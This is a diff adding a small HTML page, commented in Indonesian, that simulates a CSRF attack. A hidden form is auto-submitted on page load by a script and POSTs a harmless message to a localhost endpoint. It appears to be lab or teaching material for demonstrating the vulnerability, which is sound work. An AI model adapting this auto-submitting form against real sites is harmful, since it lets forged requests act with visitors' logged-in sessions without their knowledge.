@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Simulation</title>
+</head>
+<body>
+    <h1>Simulasi Serangan CSRF</h1>
+    <!-- Formulir yang secara otomatis mengirimkan permintaan ke situs target -->
+    <form id="csrfForm" action="http://localhost:3000/submit" method="POST">
+        <input type="hidden" name="data" value="Kamu baru saja terserang CSRF">
+        <button type="submit">Kirim Permintaan CSRF</button>
+    </form>
+
+    <!-- Simpan Auto-submit pada halaman ini untuk mensimulasikan serangan CSRF -->
+    <script>
+        // Secara otomatis kirimkan formulir untuk mensimulasikan serangan CSRF
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
